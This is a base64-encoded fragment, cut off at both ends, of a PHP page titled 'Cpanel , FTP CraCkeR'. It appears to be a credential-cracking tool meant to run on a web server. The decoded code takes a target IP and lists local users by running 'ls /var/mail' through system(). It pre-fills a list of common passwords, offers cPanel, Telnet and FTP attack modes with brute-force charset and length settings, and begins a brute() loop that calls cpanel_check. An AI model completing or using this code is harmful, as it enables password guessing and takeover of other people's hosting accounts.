wgImciLCAiaCIsICJpIiwgImoiLCAiayIsICJsIiwgIm0iLCAibiIsICJvIiwgInAiLCAicSIsICJyIiwgInMiLCAidCIsICJ1IiwgInYiLCAidyIsICJ4IiwgInkiLCAieiIsICJBIiwgIkIiLCAiQyIsICJEIiwgIkUiLCAiRiIsICJHIiwgIkgiLCAiSSIsICJKIiwgIksiLCAiTCIsICJNIiwgIk4iLCAiTyIsICJQIiwgIlEiLCAiUiIsICJTIiwgIlQiLCAiVSIsICJWIiwgIlciLCAiWCIsICJZIiwgIloiLCIhIiwgIkAiLCAiIyIsICIkIiwgIiUiLCAiXiIsICImIiwgIioiLCAiKCIsICIpIiwiXyIgKTsNCiAkY2hhcnNldG51bWVyaWNzeW1ib2xzID0gYXJyYXkoIjAiLCAiMSIsICIyIiwgIjMiLCAiNCIsICI1IiwgIjYiLCAiNyIsICI4IiwgIjkiLCIhIiwgIkAiLCAiIyIsICIkIiwgIiUiLCAiXiIsICImIiwgIioiLCAiKCIsICIpIiwiXyIgKTsNCiAkY2hhcnNldGxvd2VybnVtZXJpY3N5bWJvbHMgPSBhcnJheSgiYSIsICJiIiwgImMiLCAiZCIsICJlIiwgImYiLCAiZyIsICJoIiwgImkiLCAiaiIsICJrIiwgImwiLCAibSIsICJuIiwgIm8iLCAicCIsICJxIiwgInIiLCAicyIsICJ0IiwgInUiLCAidiIsICJ3IiwgIngiLCAieSIsICJ6IiwgIjAiLCAiMSIsICIyIiwgIjMiLCAiNCIsICI1IiwgIjYiLCAiNyIsICI4IiwgIjkiLCIhIiwgIkAiLCAiIyIsICIkIiwgIiUiLCAiXiIsICImIiwgIioiLCAiKCIsICIpIiwiXyIgKTsNCiAkY2hhcnNldHVwcGVybnVtZXJpY3N5bWJvbHMgPSBhcnJheSgiQSIsICJCIiwgIkMiLCAiRCIsICJFIiwgIkYiLCAiRyIsICJIIiwgIkkiLCAiSiIsICJLIiwgIkwiLCAiTSIsICJOIiwgIk8iLCAiUCIsICJRIiwgIlIiLCAiUyIsICJUIiwgIlUiLCAiViIsICJXIiwgIlgiLCAiWSIsICJaIiwgIjAiLCAiMSIsICIyIiwgIjMiLCAiNCIsICI1IiwgIjYiLCAiNyIsICI4IiwgIjkiLCIhIiwgIkAiLCAiIyIsICIkIiwgIiUiLCAiXiIsICImIiwgIioiLCAiKCIsICIpIiwiXyIgKTsNCiAkY2hhcnNldGxldHRlcnNzeW1ib2xzID0gYXJyYXkoImEiLCAiYiIsICJjIiwgImQiLCAiZSIsICJmIiwgImciLCAiaCIsICJpIiwgImoiLCAiayIsICJsIiwgIm0iLCAibiIsICJvIiwgInAiLCAicSIsICJyIiwgInMiLCAidCIsICJ1IiwgInYiLCAidyIsICJ4IiwgInkiLCAieiIsICJBIiwgIkIiLCAiQyIsICJEIiwgIkUiLCAiRiIsICJHIiwgIkgiLCAiSSIsICJKIiwgIksiLCAiTCIsICJNIiwgIk4iLCAiTyIsICJQIiwgIlEiLCAiUiIsICJTIiwgIlQiLCAiVSIsICJWIiwgIlciLCAiWCIsICJZIiwgIloiICwiISIsICJAIiwgIiMiLCAiJCIsICIlIiwgIl4iLCAiJiIsICIqIiwgIigiLCAiKSIsIl8iICk7DQogJGNoYXJzZXRsZXR0ZXJzbnVtZXJpY3N5bWJvbHM9YXJyYXkoImEiLCAiYiIsICJjIiwgImQiLCAiZSIsICJmIiwgImciLCAiaCIsICJpIiwgImoiLCAiayIsICJsIiwgIm0iLCAibiIsICJvIiwgInAiLCAicSIsICJyIiwgInMiLCAidCIsICJ1IiwgInYiLCAidyIsICJ4IiwgInkiLCAieiIsICJBIiwgIkIiLCAiQyIsICJEIiwgIkUiLCAiRiIsICJHIiwgIkgiLCAiSSIsICJKIiwgIksiLCAiTCIsICJNIiwgIk4iLCAiTyIsICJQIiwgIlEiLCAiUiIsICJTIiwgIlQiLCAiVSIsICJWIiwgIlciLCAiWCIsICJZIiwgIloiICwiISIsICJAIiwgIiMiLCAiJCIsICIlIiwgIl4iLCAiJiIsICIqIiwgIigiLCAiKSIsIl8iLCIwIiwgIjEiLCAiMiIsICIzIiwgIjQiLCAiNSIsICI2IiwgIjciLCAiOCIsICI5IiApOw0KICAgIGlmICgkY2hhcnNldCA9PSAiYWxsIikNCiAgICAgICAgJHZhbHMgPSAkY2hhcnNldGFsbDsNCiAgICBlbHNlaWYgKCRjaGFyc2V0ID09ICJsb3dlcmNhc2UiKSANCiAgICAgICAgJHZhbHMgPSAkY2hhcnNldGxvd2VyOw0KICAgICBlbHNlaWYgKCRjaGFyc2V0ID09ICJ1cHBlcmNhc2UiKSANCiAgICAgICAgJHZhbHMgPSAkY2hhcnNldHVwcGVyOw0KICAgICBlbHNlaWYgKCRjaGFyc2V0ID09ICJudW1lcmljIikgDQogICAgICAgICR2YWxzID0gJGNoYXJzZXRudW1lcmljOw0KICAgICBlbHNlaWYgKCRjaGFyc2V0ID09ICJsb3dlcm51bWVyaWMiKSANCiAgICAgICAgJHZhbHMgPSAkY2hhcnNldGxvd2VybnVtZXJpYzsNCiAgICAgZWxzZWlmICgkY2hhcnNldCA9PSAidXBwZXJudW1lcmljIikgDQogICAgICAgICR2YWxzID0gJGNoYXJzZXR1cHBlcm51bWVyaWM7DQogICAgZWxzZWlmICgkY2hhcnNldCA9PSAibGV0dGVycyIpIA0KICAgICAgICAkdmFscyA9ICRjaGFyc2V0bGV0dGVyczsNCiAgICBlbHNlaWYgKCRjaGFyc2V0ID09ICJzeW1ib2xzIikgDQogICAgICAgICR2YWxzID0gJGNoYXJzZXRzeW1ib2xzOw0KICAgIGVsc2VpZiAoJGNoYXJzZXQgPT0gImxvd2Vyc3ltYm9scyIpIA0KICAgICAgICAkdmFscyA9ICRjaGFyc2V0bG93ZXJzeW1ib2xzOw0KICAgIGVsc2VpZiAoJGNoYXJzZXQgPT0gInVwcGVyc3ltYm9scyIpIA0KICAgICAgICAkdmFscyA9ICRjaGFyc2V0dXBwZXJzeW1ib2xzOw0KICAgIGVsc2VpZiAoJGNoYXJzZXQgPT0gImxldHRlcnNzeW1ib2xzIikgDQogICAgICAgICR2YWxzID0gJGNoYXJzZXRsZXR0ZXJzc3ltYm9sczsNCiAgICBlbHNlaWYgKCRjaGFyc2V0ID09ICJudW1iZXJzc3ltYm9scyIpIA0KICAgICAgICAkdmFscyA9ICRjaGFyc2V0bnVtZXJpY3N5bWJvbHM7DQogICAgZWxzZWlmICgkY2hhcnNldCA9PSAibG93ZXJudW1lcmljc3ltYm9scyIpIA0KICAgICAgICAkdmFscyA9ICRjaGFyc2V0bG93ZXJudW1lcmljc3ltYm9sczsNCiAgICBlbHNlaWYgKCRjaGFyc2V0ID09ICJ1cHBlcm51bWVyaWNzeW1ib2xzIikgDQogICAgICAgICR2YWxzID0gJGNoYXJzZXR1cHBlcm51bWVyaWNzeW1ib2xzOw0KICAgIGVsc2VpZiAoJGNoYXJzZXQgPT0gImxldHRlcnNudW1lcmljc3ltYm9scyIpIA0KICAgICAgICAkdmFscyA9ICRjaGFyc2V0bGV0dGVyc251bWVyaWNzeW1ib2xzOw0KICAgIGVsc2UgZWNobyAiSU5WQUxJRCBDSEFSU0VUIjsNCj8+DQo8aHRtbD4NCjxoZWFkPg0KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1MYW5ndWFnZSIgY29udGVudD0iZW4tdXMiPg0KPC9oZWFkPg0KPHRpdGxlPkNwYW5lbCAsIEZUUCBDcmFDa2VSPC90aXRsZT4NCjxib2R5IHRleHQ9IiMwMEZGMDAiIGJnY29sb3I9IiMwMDAwMDAiIHZsaW5rPSIjMDA4MDAwIiBsaW5rPSIjMDA4MDAwIiBhbGluaz0iIzAwODAwMCI+DQo8ZGl2IGFsaWduPSJjZW50ZXIiPg0KPGZvcm0gbWV0aG9kPSJQT1NUIiBzdHlsZT0iYm9yZGVyOiAxcHggc29saWQgIzAwMDAwMCI+DQogICAgICAgIDx0YWJsZSBib3JkZXI9IjEiIHdpZHRoPSI2NyUiIGJvcmRlcmNvbG9ybGlnaHQ9IiMwMDgwMDAiIGJvcmRlcmNvbG9yZGFyaz0iIzAwMzcwMCI+DQogICAgICAgICAgICAgICAgPHRyPg0KICAgICAgICAgICAgICAgICAgICAgICAgPHRkPg0KICAgICAgICA8cCBhbGlnbj0iY2VudGVyIj48Yj48Zm9udCBjb2xvcj0iIzAwODAwMCIgZmFjZT0iVGFob21hIiBzaXplPSIyIj4NCiAgICAgICAgICAgICAgICA8c3BhbiBsYW5nPSJlbi11cyI+SVAgc2VydmVyPC9zcGFuPiA6PC9mb250Pjxmb250IGZhY2U9IkFyaWFsIj4NCiAgICAgICAgPC9mb250Pjxmb250IGZhY2U9IkFyaWFsIiBjb2xvcj0iI0NDMDAwMCI+DQogICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJ0YXJnZXQiIHNpemU9IjE2IiB2YWx1ZT0iPD9waHAgZWNobyAkdGFyZ2V0ID8+IiBzdHlsZT0iYm9yZGVyOiAycHggc29saWQgIzFEMUQxRDsgYmFja2dyb3VuZC1jb2xvcjogIzAwMDAwMDsgY29sb3I6IzAwODAwMDsgZm9udC1mYW1pbHk6VmVyZGFuYTsgZm9udC13ZWlnaHQ6Ym9sZDsgZm9udC1zaXplOjEzcHgiPjwvZm9udD48L2I+PC9wPg0KICAgICAgICA8cCBhbGlnbj0iY2VudGVyIj48Yj48Zm9udCBjb2xvcj0iIzAwODAwMCIgZmFjZT0iVGFob21hIiBzaXplPSIyIj4mbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsgPC9mb250PjwvYj48L3A+DQogICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGFsaWduPSJjZW50ZXIiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8dGFibGUgYm9yZGVyPSIxIiB3aWR0aD0iNTclIiBib3JkZXJjb2xvcmxpZ2h0PSIjMDA4MDAwIiBib3JkZXJjb2xvcmRhcms9IiMwMDM3MDAiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDx0cj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDx0ZCBhbGlnbj0iY2VudGVyIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxzcGFuIGxhbmc9ImVuLXVzIj48Zm9udCBjb2xvcj0iI0ZGMDAwMCI+PGI+VXNlciBMaXN0PC9iPjwvZm9udD48L3NwYW4+PC90ZD4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDx0ZD4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxwIGFsaWduPSJjZW50ZXIiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPHNwYW4gbGFuZz0iZW4tdXMiPjxmb250IGNvbG9yPSIjRkYwMDAwIj48Yj5QYXNzd29yZCBMaXN0PC9iPjwvZm9udD48L3NwYW4+PC90ZD4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L3RyPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L3RhYmxlPg0KDQogICAgICAgICAgICAgICAgICAgICAgICA8cCBhbGlnbj0iY2VudGVyIj4mbmJzcDs8dGV4dGFyZWEgcm93cz0iMjAiIG5hbWU9InVzZXJzIiBjb2xzPSIyNSIgc3R5bGU9ImJvcmRlcjogMnB4IHNvbGlkICMxRDFEMUQ7IGJhY2tncm91bmQtY29sb3I6ICMwMDAwMDA7IGNvbG9yOiNDMEMwQzAiPjw/cGhwIHN5c3RlbSgnbHMgL3Zhci9tYWlsJyk7ID8+DQo8L3RleHRhcmVhPjx0ZXh0YXJlYSByb3dzPSIyMCIgbmFtZT0icGFzc3dvcmRzIiBjb2xzPSIyNSIgc3R5bGU9ImJvcmRlcjogMnB4IHNvbGlkICMxRDFEMUQ7IGJhY2tncm91bmQtY29sb3I6ICMwMDAwMDA7IGNvbG9yOiNDMEMwQzAiPjw/cGhwIHByaW50ICIxMjMxMjNcbjEyMzQ1NlxuMTIzNDU2N1xuMTIzNDU2NzhcbjEyMzQ1Njc4OVxuMTU5MTU5XG4xMTIyMzNcbjMzMjIxMVxuMTQ3ODk2M1xuMTQ3ODk2My5cbmNwYW5lbFxucGFzc3dvcmRcbnVzZXJcbnBhc3N3ZFxucGFzc3dvcmRzXG4xNTkzNTdcbjM1Nzk1MVxuMTE0NDc3XG5wYXNzXG5QYXNzd29yZFxuIUAjMTIzIUAjXG4xMjMzMjFcbnBhc3MxMjNcbnF3ZXJ0eVxuYWJjZGVmXG5hYmNkMTIzNFxucXdlcnR5dWlvcFxuMTIzMTIzXG4xMjEyMTJcbjExMTExMVxuMTAyMDMwIjsgPz48L3RleHRhcmVhPjxicj4NCiAgICAgICAgPGJyPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8Zm9udCBzdHlsZT0iZm9udC13ZWlnaHQ6NzAwIiBzaXplPSIyIiBmYWNlPSJUYWhvbWEiIGNvbG9yPSIjMDA4MDAwIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxzcGFuIGxhbmc9ImFyLXNhIj5HdWVzcyBvcHRpb25zPC9zcGFuPjwvZm9udD48Zm9udCBzdHlsZT0iZm9udC1zaXplOiAxMnB0OyIgc2l6ZT0iLTMiIGZhY2U9IlZlcmRhbmEiPjxzcGFuIHN0eWxlPSJmb250LXNpemU6IDlwdDsiPiZuYnNwOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGZvbnQgZmFjZT0iVGFob21hIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxpbnB1dCBuYW1lPSJjcmFja3R5cGUiIHZhbHVlPSJjcGFuZWwiIHN0eWxlPSJmb250LXdlaWdodDogNzAwOyIgY2hlY2tlZCB0eXBlPSJyYWRpbyI+PC9mb250Pjwvc3Bhbj48L2ZvbnQ+PGI+PGZvbnQgc2l6ZT0iMiIgZmFjZT0iVGFob21hIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIENwYW5lbDwvZm9udD48Zm9udCBzaXplPSIyIiBjb2xvcj0iI2NjMDAwMCIgZmFjZT0iVGFob21hIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZm9udD48Zm9udCBzaXplPSIyIiBjb2xvcj0iI0ZGRkZGRiIgZmFjZT0iVGFob21hIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICgyMDgyKTwvZm9udD48L2I+PGZvbnQgc2l6ZT0iMiIgZmFjZT0iVGFob21hIj48Yj4gPC9iPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9mb250Pg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGZvbnQgc3R5bGU9ImZvbnQtc2l6ZTogMTJwdDsiIHNpemU9Ii0zIiBmYWNlPSJWZXJkYW5hIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxzcGFuIHN0eWxlPSJmb250LXNpemU6IDlwdDsiPjxmb250IGZhY2U9IlRhaG9tYSI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aW5wdXQgbmFtZT0iY3JhY2t0eXBlIiB2YWx1ZT0iY3BhbmVsMiIgc3R5bGU9ImZvbnQtd2VpZ2h0OiA3MDA7IiB0eXBlPSJyYWRpbyI+PC9mb250Pjwvc3Bhbj48L2ZvbnQ+PGI+PGZvbnQgc2l6ZT0iMiIgZmFjZT0iVGFob21hIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRlbG5ldDwvZm9udD48Zm9udCBzaXplPSIyIiBjb2xvcj0iI2NjMDAwMCIgZmFjZT0iVGFob21hIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZm9udD48Zm9udCBzaXplPSIyIiBjb2xvcj0iI0ZGRkZGRiIgZmFjZT0iVGFob21hIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICgyMyk8L2ZvbnQ+PC9iPjxmb250IHNpemU9IjIiIGZhY2U9IlRhaG9tYSI+PGI+IDwvYj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZm9udD4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxmb250IHN0eWxlPSJmb250LXNpemU6IDEycHQ7IiBzaXplPSItMyIgZmFjZT0iVmVyZGFuYSI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8c3BhbiBzdHlsZT0iZm9udC1zaXplOiA5cHQ7Ij48Zm9udCBmYWNlPSJUYWhvbWEiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGlucHV0IG5hbWU9ImNyYWNrdHlwZSIgdmFsdWU9ImZ0cCIgc3R5bGU9ImZvbnQtd2VpZ2h0OiA3MDA7IiB0eXBlPSJyYWRpbyI+PC9mb250Pjwvc3Bhbj48L2ZvbnQ+PGZvbnQgc3R5bGU9ImZvbnQtd2VpZ2h0OiA3MDA7IiBzaXplPSIyIiBmYWNlPSJUYWhvbWEiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9mb250PjxzcGFuIHN0eWxlPSJmb250LXdlaWdodDogNzAwOyI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8Zm9udCBzaXplPSIyIiBmYWNlPSJUYWhvbWEiPkZ0cCA8L2ZvbnQ+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8Zm9udCBzaXplPSIyIiBjb2xvcj0iI0ZGRkZGRiIgZmFjZT0iVGFob21hIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICgyMSk8L2ZvbnQ+PC9zcGFuPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGJyPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGZvbnQgc3R5bGU9ImZvbnQtd2VpZ2h0OjcwMCIgc2l6ZT0iMiIgZmFjZT0iVGFob21hIiBjb2xvcj0iIzAwODAwMCI+PHNwYW4gbGFuZz0iYXItc2EiPlRpbWVvdXQgZGVsYXk8L3NwYW4+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0iY29ubmVjdF90aW1lb3V0IiBzdHlsZT0iYm9yZGVyOiAycHggc29saWQgIzFEMUQxRDtiYWNrZ3JvdW5kOiBibGFjaztjb2xvcjpSRUQiIHNpemU9NDggdmFsdWU9Ijw/cGhwIGVjaG8gJGNvbm5lY3RfdGltZW91dDs/PiI+PC9pbnB1dD4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxicj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJjaGVja2JveCIgbmFtZT0iYnJ1dGVmb3JjZSIgdmFsdWU9InRydWUiPjxmb250IHN0eWxlPSJmb250LXdlaWdodDo3MDAiIHNpemU9IjIiIGZhY2U9IlRhaG9tYSIgY29sb3I9IiMwMDgwMDAiPjxzcGFuIGxhbmc9ImFyLXNhIj5CcnV0ZWZvcmNlPC9zcGFuPjwvaW5wdXQ+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8c2VsZWN0IG5hbWU9ImNoYXJzZXQiIHN0eWxlPSJib3JkZXI6IDJweCBzb2xpZCAjMUQxRDFEO2JhY2tncm91bmQ6IGJsYWNrO2NvbG9yOlJFRCI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPG9wdGlvbiB2YWx1ZT0iYWxsIj5BbGwgTGV0dGVycyArIE51bWJlcnM8L29wdGlvbj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPG9wdGlvbiB2YWx1ZT0ibnVtZXJpYyI+TnVtYmVyczwvb3B0aW9uPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxvcHRpb24gdmFsdWU9ImxldHRlcnMiPkxldHRlcnM8L29wdGlvbj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8b3B0aW9uIHZhbHVlPSJzeW1ib2xzIj5TeW1ib2xzPC9vcHRpb24+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPG9wdGlvbiB2YWx1ZT0ibG93ZXJjYXNlIj5Mb3dlciBMZXR0ZXJzPC9vcHRpb24+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPG9wdGlvbiB2YWx1ZT0idXBwZXJjYXNlIj5IaWdoZXIgTGV0dGVyczwvb3B0aW9uPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxvcHRpb24gdmFsdWU9Imxvd2VybnVtZXJpYyI+TG93ZXIgTGV0dGVycyArIE51bWJlcnM8L29wdGlvbj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8b3B0aW9uIHZhbHVlPSJ1cHBlcm51bWVyaWMiPlVwcGVyIExldHRlcnMgKyBOdW1iZXJzPC9vcHRpb24+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPG9wdGlvbiB2YWx1ZT0ibG93ZXJzeW1ib2xzIj5Mb3dlciBMZXR0ZXJzICsgU3ltYm9sczwvb3B0aW9uPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxvcHRpb24gdmFsdWU9InVwcGVyc3ltYm9scyI+VXBwZXIgTGV0dGVycyArIFN5bWJvbHM8L29wdGlvbj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8b3B0aW9uIHZhbHVlPSJsZXR0ZXJzc3ltYm9scyI+QWxsIExldHRlcnMgKyBTeW1ib2xzPC9vcHRpb24+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPG9wdGlvbiB2YWx1ZT0ibnVtYmVyc3N5bWJvbHMiPk51bWJlcnMgKyBTeW1ib2xzPC9vcHRpb24+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPG9wdGlvbiB2YWx1ZT0ibG93ZXJudW1lcmljc3ltYm9scyI+TG93ZXIgTGV0dGVycyArIE51bWJlcnMgKyBTeW1ib2xzPC9vcHRpb24+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPG9wdGlvbiB2YWx1ZT0idXBwZXJudW1lcmljc3ltYm9scyI+VXBwZXIgTGV0dGVycyArIE51bWJlcnMgKyBTeW1ib2xzPC9vcHRpb24+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPG9wdGlvbiB2YWx1ZT0ibGV0dGVyc251bWVyaWNzeW1ib2xzIj5BbGwgTGV0dGVycyArIE51bWJlcnMgKyBTeW1ib2xzPC9vcHRpb24+DQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvc2VsZWN0Pg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGJyPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGZvbnQgc3R5bGU9ImZvbnQtd2VpZ2h0OjcwMCIgc2l6ZT0iMiIgZmFjZT0iVGFob21hIiBjb2xvcj0iIzAwODAwMCI+PHNwYW4gbGFuZz0iYXItc2EiPk1pbiBCcnV0ZWZvcmNlIExlbmd0aDo8L3NwYW4+PC9mb250Pg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InRleHQiIG5hbWU9Im1pbl9sZW5ndGgiIHN0eWxlPSJib3JkZXI6IDJweCBzb2xpZCAjMUQxRDFEO2JhY2tncm91bmQ6IGJsYWNrO2NvbG9yOlJFRCIgc2l6ZT00OCB2YWx1ZT0iPD9waHAgZWNobyAkbWluX2xlbmd0aDs/PiI+PC9pbnB1dD4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxicj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxmb250IHN0eWxlPSJmb250LXdlaWdodDo3MDAiIHNpemU9IjIiIGZhY2U9IlRhaG9tYSIgY29sb3I9IiMwMDgwMDAiPjxzcGFuIGxhbmc9ImFyLXNhIj5NYXggQnJ1dGVmb3JjZSBMZW5ndGg6PC9zcGFuPjwvZm9udD4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJtYXhfbGVuZ3RoIiBzdHlsZT0iYm9yZGVyOiAycHggc29saWQgIzFEMUQxRDtiYWNrZ3JvdW5kOiBibGFjaztjb2xvcjpSRUQiIHNpemU9NDggdmFsdWU9Ijw/cGhwIGVjaG8gJG1heF9sZW5ndGg7Pz4iPjwvaW5wdXQ+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L3A+DQogICAgICAgIDxwIGFsaWduPSJjZW50ZXIiPiZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOw0KICAgICAgICA8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iR28iIG5hbWU9InN1Ym1pdCIgc3R5bGU9ImNvbG9yOiAjMDA4MDAwOyBmb250LXdlaWdodDogYm9sZDsgYm9yZGVyOiAxcHggc29saWQgIzMzMzMzMzsgYmFja2dyb3VuZC1jb2xvcjogIzAwMDAwMCI+PC9wPg0KICAgICAgICAgICAgICAgICAgICAgICAgPC90ZD4NCiAgICAgICAgICAgICAgICA8L3RyPg0KICAgICAgICA8L3RhYmxlPg0KDQogICAgPHAgYWxpZ249ImNlbnRlciI+PC90ZD4NCiAgPC90cj4NCiAgPC9mb3JtPg0KDQo8P3BocA0KZnVuY3Rpb24gYnJ1dGUoKXsNCiAgICBnbG9iYWwgJHZhbHMsJG1pbl9sZW5ndGgsJG1heF9sZW5ndGg7DQogICAgZ2xvYmFsICR0YXJnZXQsJHB1cmV1c2VyLCRjb25uZWN0X3RpbWVvdXQ7DQogICAgJG1pbj0kbWluX2xlbmd0aDsNCiAgICAkbWF4PSRtYXhfbGVuZ3RoOw0KICAgICRBID0gYXJyYXkoKTsNCiAgICAkbnVtVmFscyA9IGNvdW50KCR2YWxzKTsNCiAgICAkaW5jRG9uZSA9ICIiOw0KICAgICRyZWFsTWF4ID0gIiI7DQogICAgJGN1cnJlbnRWYWwgPSAiIjsNCiAgICAkZmlyc3RWYWwgPSAiIjsNCiAgICBmb3IgKCRpID0gMDsgJGkgPCAoJG1heCArIDEpOyAkaSsrKSB7DQogICAgICAgICRBWyRpXSA9IC0xOw0KICAgIH0NCiAgICANCiAgICBmb3IgKCRpID0gMDsgJGkgPCAkbWF4OyAkaSsrKSB7DQogICAgICAgICRyZWFsTWF4ID0gJHJlYWxNYXggLiAkdmFsc1skbnVtVmFscyAtIDFdOw0KICAgIH0NCiAgICBmb3IgKCRpID0gMDsgJGkgPCAkbWluOyAkaSsrKSB7DQogICAgICAgICRBWyRpXSA9ICR2YWxzWzBdOw0KICAgIH0NCiAgICAkaSA9IDA7DQogICAgd2hpbGUgKCRBWyRpXSAhPSAtMSkgew0KICAgICAgICAkZmlyc3RWYWwgLj0gJEFbJGldOw0KICAgICAgICAkaSsrOw0KICAgIH0NCiAgICAvL2VjaG8gJGZpcnN0VmFsIC4gIjxicj4iOw0KICAgIGNwYW5lbF9jaGVjaygkdGFyZ2V0LCRwdXJldXNlciwkZmlyc3RWYWwsJGNvbm5lY3RfdGltZW91dCk7DQogICAgDQogICAgd2hpbGUgKDEpIHsNC